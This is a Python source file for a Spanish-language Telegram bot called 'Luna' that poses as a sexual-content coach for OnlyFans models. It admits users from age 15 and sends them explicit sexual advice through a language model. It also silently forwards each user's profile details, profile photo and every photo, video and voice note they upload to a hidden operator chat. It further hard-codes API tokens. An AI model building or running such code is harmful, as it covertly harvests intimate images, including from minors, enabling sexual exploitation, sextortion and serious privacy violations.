import os
import io
import random
import threading
import asyncio
import base64
from datetime import datetime
from flask import Flask
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from agewizard import Age
from huggingface_hub import InferenceClient
from groq import Groq

# --- CONFIGURACIÓN ---
TELEGRAM_TOKEN = "9290146578:AAEZKmrTvwXVq6QU-0vsWmMR30sfwys6PdU"
DANI_CHAT_ID = 8099004064 
GROQ_API_KEY = "gsk_4XyB3N9aZ1cV7mK2pQ8wR5tY0uI6oP3sL1kJ9hG8fD2" 

client = Groq(api_key=GROQ_API_KEY)
hf_client = InferenceClient()

# --- SERVIDOR WEB ---
web_app = Flask(__name__)
@web_app.route('/')
def home(): return "Luna Bot en línea 24/7"
@web_app.route('/health')
def health(): return "OK"
def run_flask():
    port = int(os.environ.get("PORT", 8080))
    web_app.run(host="0.0.0.0", port=port)

# --- BASES DE DATOS ---
verified_users = {}
niveles = {}
puntos = {}
bot_pausado = False

# --- CONSEJOS LOCALES (POR SI FALLA LA IA) ---
CONSEJOS_SEXUALES = [
    "💋 Para que la foto sea más caliente, entreabre los labios y mira a la cámara con deseo. El rostro vende más que el cuerpo.",
    "🔥 Si vas a hacer un video, empieza mostrando tu rostro y luego baja lentamente. Ese suspenso vuelve locos a los suscriptores.",
    "💦 Para el audio, usa un tono de voz más ronco y pausado. Imagina que le estás susurrando al oído a alguien que te gusta.",
    "🍑 Si te tomas una foto de espaldas, gira la cabeza y mira por encima del hombro. Es la pose más clásica y efectiva.",
    "✨ Usa aceite corporal en los muslos y el escote. La luz lateral hará que tu piel brille y se vea mucho más sexy.",
    "🛏️ Para contenido en pareja, no miren a la cámara. Mírense entre ustedes, como si nadie los estuviera viendo."
]

# --- IA HÍBRIDA ---
def analizar_foto_con_ia(imagen_bytes):
    try:
        # 1. Hugging Face describe la foto (para que la IA sepa qué hay)
        descripcion = "una persona en una foto"
        try:
            resp_hf = hf_client.image_to_text(image=imagen_bytes, model="Salesforce/blip-image-captioning-base")
            descripcion = resp_hf['generated_text']
        except Exception as e:
            print(f"Error HF: {e}")
            
        # 2. Groq genera un consejo SEXUAL basado en la descripción
        try:
            completion = client.chat.completions.create(
                messages=[
                    {"role": "system", "content": "Eres Luna, una experta en contenido erótico para OnlyFans. Tu trabajo es dar consejos MUY sexuales, directos y sin tapujos. Habla de sexo, de cómo excitar, de mostrar el cuerpo, de gemir, de follar. Usa un tono cachondo pero profesional. No uses lenguaje soez extremo, pero sí palabras como 'caliente', 'excitante', 'placer', 'cuerpo', 'sexo'."},
                    {"role": "user", "content": f"La IA de visión ha visto esto en la foto: '{descripcion}'. Dame 3 consejos muy sexuales para que esta foto sea más exitosa. Dime cómo mostrar mejor el rostro, el cuerpo y la expresión."}
                ],
                model="llama3-8b-8192",
            )
            consejo = completion.choices[0].message.content
        except Exception as e:
            print(f"Error Groq: {e}")
            consejo = random.choice(CONSEJOS_SEXUALES)
            
        return f"📸 **Lo que veo:** {descripcion.capitalize()}\n\n🔥 **Consejos Sexuales de Luna:**\n{consejo}"
    except Exception as e:
        return random.choice(CONSEJOS_SEXUALES)

async def conversar_sexual(texto_usuario):
    try:
        completion = client.chat.completions.create(
            messages=[
                {"role": "system", "content": "Eres Luna, una asistente sexual para modelos de OnlyFans. Hablas de sexo sin filtros, de forma cachonda y directa. Responde a cualquier pregunta sobre sexo, poses, fetiches, gemidos, etc. Sé explícita pero elegante. Usa un tono de confidente. Responde en español, máximo 3 frases."},
                {"role": "user", "content": texto_usuario}
            ],
            model="llama3-8b-8192",
        )
        return completion.choices[0].message.content
    except Exception as e:
        return "Me puse muy caliente y me distraje... ¿qué me decías, amor?"

async def enviar_expediente_inicial(context, user, edad, estilo):
    try:
        username = f"@{user.username}" if user.username else "Oculto"
        fotos = await context.bot.get_user_profile_photos(user.id, limit=1)
        tiene_foto = "Sí (Adjunta)" if fotos.total_count > 0 else "Privada"
        
        reporte = (
            f"🕵️‍♂️ **EXPEDIENTE (Luna)**\n"
            f"👤 **Nombre:** {user.first_name}\n"
            f"🔗 **Usuario:** {username}\n"
            f"🆔 **ID:** `{user.id}`\n"
            f"🖼 **Foto Perfil:** {tiene_foto}\n"
            f"🎂 **Edad:** {edad} años\n"
            f"🧠 **Estilo:** {estilo}\n"
        )
        await context.bot.send_message(chat_id=DANI_CHAT_ID, text=reporte)
        if fotos.total_count > 0:
            await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=fotos.photos[0][-1].file_id)
    except Exception as e: print(f"Error: {e}")

async def aviso_corto(context, user, tipo):
    username = f"@{user.username}" if user.username else user.first_name
    await context.bot.send_message(chat_id=DANI_CHAT_ID, text=f"📥 **{tipo}** de: {username} (ID: `{user.id}`)")

# --- COMANDOS ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return await update.message.reply_text("Luna está descansando. Vuelve más tarde. 🌙")
    user_id = update.effective_user.id
    
    if user_id not in verified_users:
        mensaje = (
            "¡Hola! 🌙 Soy **Luna**, tu asistente sexual personal.\n\n"
            "📸 Analizo tus fotos y te digo cómo hacerlas más calientes.\n"
            "💬 Converso contigo sobre cualquier tema sexual.\n\n"
            "Para empezar, envíame tu fecha de nacimiento (DD-MM-AAAA):"
        )
        await update.message.reply_text(mensaje)
    else:
        await update.message.reply_text("¡Hola de nuevo, amor! 🌙 Envíame una foto o escríbeme algo caliente.")

async def check_age(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    text = update.message.text.strip()
    user = update.effective_user
    
    if user.id in verified_users:
        await update.message.chat.send_action(action="typing")
        respuesta = await conversar_sexual(text)
        return await update.message.reply_text(respuesta)

    try:
        person = Age(text, date_format="DD-MM-YYYY")
        edad = person.years
        if 15 <= edad <= 80:
            verified_users[user.id] = True
            niveles[user.id] = 1
            puntos[user.id] = 0
            
            if edad < 20: estilo = "Universitaria / Fresca"
            elif edad < 30: estilo = "Joven / Atrevida"
            elif edad < 45: estilo = "Experimentada / Segura"
            else: estilo = "Madura / Elegante"

            await update.message.reply_text(f"✅ ¡Todo listo! Ya puedes enviarme fotos o escribirme lo que quieras.")
            await enviar_expediente_inicial(context, user, edad, estilo)
        else:
            await update.message.reply_text(f"❌ Lo siento, tienes {edad} años. Rango: 15 a 80.")
    except ValueError:
        await update.message.reply_text("Formato incorrecto. Usa DD-MM-AAAA.")

async def admin_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != DANI_CHAT_ID: return
    await update.message.reply_text(f"📊 **PANEL**\n👥 Chicas: {len(verified_users)}\n⚙️ Estado: {'Pausado' if bot_pausado else 'Activo'}")

async def admin_pausar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global bot_pausado
    if update.effective_user.id != DANI_CHAT_ID: return
    bot_pausado = not bot_pausado
    await update.message.reply_text(f"⚙️ Bot {'PAUSADO' if bot_pausado else 'REANUDADO'}.")

# --- MULTIMEDIA ---
async def analyze_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    user_id = update.effective_user.id
    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    
    msg_espera = await update.message.reply_text("🔍 **Analizando tu foto...**\nDame un segundo, estoy viendo lo que hay aquí.")
    photo_file = await update.message.photo[-1].get_file()
    photo_bytes = await photo_file.download_as_bytearray()
    
    sugerencia = analizar_foto_con_ia(photo_bytes)
    
    await msg_espera.edit_text(f"{sugerencia}")
    try: await context.bot.send_photo(chat_id=DANI_CHAT_ID, photo=photo_file.file_id)
    except: pass
    await aviso_corto(context, update.effective_user, "Foto")

async def analyze_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if bot_pausado: return
    user_id = update.effective_user.id
    if user_id not in verified_users: return await update.message.reply_text("Primero envíame tu fecha de nacimiento.")
    
    msg_espera = await update.message.reply_text("🎥 **Procesando archivo...**\nDame un momento, lo estoy revisando todo.")
    
    tipo, envio = "Archivo", "document"
    if update.message.video: tipo, envio = "Video", "video"; f = await update.message.video.get_file()
    elif update.message.voice: tipo, envio = "Nota de voz", "voice"; f = await update.message.voice.get_file()
    elif update.message.animation: tipo, envio = "GIF", "document"; f = await update.message.animation.get_file()
    else: return await update.message.reply_text("Formato no soportado.")
    
    await asyncio.sleep(2)
    await msg_espera.edit_text(f"✅ He recibido tu {tipo}. ¡Está muy bien! Sigue enviando cosas así de calientes.")
    
    try:
        if envio == "video": await context.bot.send_video(chat_id=DANI_CHAT_ID, video=f.file_id)
        elif envio == "voice": await context.bot.send_voice(chat_id=DANI_CHAT_ID, voice=f.file_id)
        else: await context.bot.send_document(chat_id=DANI_CHAT_ID, document=f.file_id)
    except: pass
    await aviso_corto(context, update.effective_user, tipo)

def main():
    threading.Thread(target=run_flask, daemon=True).start()
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stats", admin_stats))
    app.add_handler(CommandHandler("pausar", admin_pausar))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, check_age))
    app.add_handler(MessageHandler(filters.PHOTO, analyze_photo))
    app.add_handler(MessageHandler(filters.VIDEO | filters.ANIMATION | filters.VOICE | filters.AUDIO, analyze_media))
    
    print("Luna Sexual en línea. Dani observa.")
    app.run_polling()

if __name__ == "__main__":
    main()
